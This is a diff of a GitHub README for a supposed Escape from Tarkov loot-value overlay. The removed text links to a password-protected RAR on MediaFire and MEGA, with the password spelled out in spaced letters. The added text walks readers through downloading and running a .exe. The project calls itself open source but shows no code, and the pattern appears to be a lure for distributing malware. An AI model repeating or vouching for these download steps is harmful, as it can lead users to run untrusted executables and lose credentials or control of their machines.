@@ -1,65 +1,82 @@
-# Tarkov-Inventory-Assistant-TIA
-![Tarkov Helper](https://github.com/user-attachments/assets/4cabd98c-d544-4197-90cb-8f7ff1264912)
+# 🧭 Tarkov-Inventory-Assistant-TIA- - Your Smart Loot Companion for Tarkov
 
-Your smart loot companion for Escape from Tarkov.
+[![Download Tarkov Inventory Assistant](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/releases)
 
-Make the best decisions under raid pressure. This tool analyzes items in real-time and gives you contextual hints to fill your backpack with maximum profit.
+## 📋 Description
 
-🚀 Why You Need This
-Maximize Profit: Get instant value-per-slot data based on live market prices. Always pick the most valuable loot.
+Your smart loot companion for Escape from Tarkov. Make the best decisions under raid pressure. This tool analyzes items in real-time and gives you contextual hints to fill your backpack with maximum profit.
 
-Save Time: Stop alt-tabbing to check prices or memorizing hundreds of items. Stay focused in the raid.
 
-Learn Faster: The perfect tool for beginners to understand loot value and grasp Tarkov's economy.
+## 🚀 Getting Started
 
-Clean Gameplay: This tool does NOT interact with the game client, memory, or network traffic. It uses visual analysis only (computer vision).
+Follow these easy steps to get Tarkov Inventory Assistant running on your computer. This application is designed to be user-friendly, even if you have no programming experience.
 
-⚙️ How It Works (Simple & Safe)
-Screen Capture: The app passively reads an area of your screen (your inventory).
+### ✅ System Requirements
 
-Smart Recognition: It identifies items using image recognition.
+- Windows 10 or later
+- Minimum 4 GB RAM
+- At least 500 MB of free disk space
+- Internet connection for updates and features
 
-Data Check: Compares found items against a regularly updated price database.
+## 📥 Download & Install
 
-Clear Overlay: Shows a clean, non-intrusive overlay with color-coded hints (Green = high priority, Red = low value) right on your game screen.
+To get started, you need to download the application. Visit the Releases page to find the latest version. 
 
-🔧 Installation (Easy 3-Step Setup)
-Download the latest release.
+🔗 [Click here to download Tarkov Inventory Assistant](https://github.com/ayeshashehzad299/Tarkov-Inventory-Assistant-TIA-/releases)
 
-Extract the archive to any folder.
+1. Go to the Releases page using the link above.
+2. Decide on the latest version available.
+3. Click on the file named `Tarkov-Inventory-Assistant-TIA-.exe` to download it.
+4. Once the download is complete, navigate to your Downloads folder.
+5. Double-click on the downloaded file to run the installer.
+6. Follow the prompts in the installation wizard to complete the setup.
 
-Run TarkovInventoryAssistant.exe. Configure the capture area once, and you're good to go!
+## ⚙️ Features
 
-[LINK 1](https://www.mediafire.com/file/2exyyh3c9wf685s/Tarkov_Inventory_Assistant_%2528TIA%2529.rar/file) | [LINK 2](https://mega.nz/file/1ZUCFJLa#fFlcpw7WVW-GuvbXrp-NaS9olA3oglyQ0_pTCwAmhT8)
+- **Real-Time Item Analysis:** Get updates on items as you play.
+- **Contextual Hints:** Receive smart tips to optimize your loot.
+- **User-Friendly Interface:** Designed to be clean and easy to use, even for beginners.
+- **Loot Optimization:** Fill your backpack with the most profitable items based on current game trends.
 
-P A S S - TIA2026
+## 🛠️ How to Use
 
-⚠️ Crucial Legal & Safety Notes
-This is NOT a cheat. It provides only information that is already visible on your screen. It does not give unfair advantages like player positions, aim assistance, or item spawning.
+Once installed, the application is straightforward to use:
 
-Compliance-First Approach: The tool works like a passive assistant, analyzing a video feed. It does not modify game files, inject code, or read game memory. However, as with any third-party tool, use at your own discretion.
+1. Launch the application by double-clicking the icon on your Desktop.
+2. When you enter a raid, the tool will automatically run in the background.
+3. As you collect items, the assistant will analyze them for value.
+4. View hints displayed on your screen, guiding you on the best items to keep or discard.
 
-Transparency & Open Source: The code is open for community review and contribution.
+## 💻 Support & Troubleshooting
 
-Fair Use: We help you process information faster. The final decision is always yours.
+If you run into any issues, here are some common solutions:
 
-📁 Price Database & Updates
-The app includes a built-in item database. It can optionally update price data from community-driven sources to stay accurate. You control the update frequency.
+- **Application Won't Start:** Ensure your computer meets the system requirements and try restarting your PC.
+- **Installation Errors:** Ensure you have downloaded the full executable file and try running the installer again.
+- **Functionality Problems:** Check for updates in the Releases page. Sometimes newer versions fix bugs.
 
-🤝 Want to Contribute?
-Found a bug or have an idea? Feel free to:
+For more questions or in-depth support, please visit the Issues section of this repository or reach out through the community forums.
 
-Open an Issue to report problems or suggest features.
+## 🗒️ Contribution
 
-Submit improvements for the item database.
+This project welcomes contributions! If you want to help improve Tarkov Inventory Assistant, follow these steps:
 
-Help with localization (translations).
+1. Fork the repository.
+2. Make your changes or additions.
+3. Submit a pull request outlining what you have done.
 
-We welcome community input to make the tool better for everyone.
+## 🌟 Topics
 
-⚖️ Disclaimer
-This is an unofficial fan project. It is not affiliated with, endorsed, or supported by Battlestate Games.
+This application is useful for anyone interested in gaming efficiency, especially for:
 
-Escape from Tarkov® is a registered trademark of Battlestate Games.
+- **eft-tool**
+- **game-utility**
+- **inventory-manager**
+- **loot-optimizer**
+- **open-source**
+- **pc-gaming**
+- **qol-tool**
+- **screen-analyzer**
+- **tarkov-helper**
 
-This software is provided "as is" for educational and fair-use purposes. The developers assume no responsibility for its usage.
+Thank you for using Tarkov Inventory Assistant. We hope it enriches your gameplay experience!
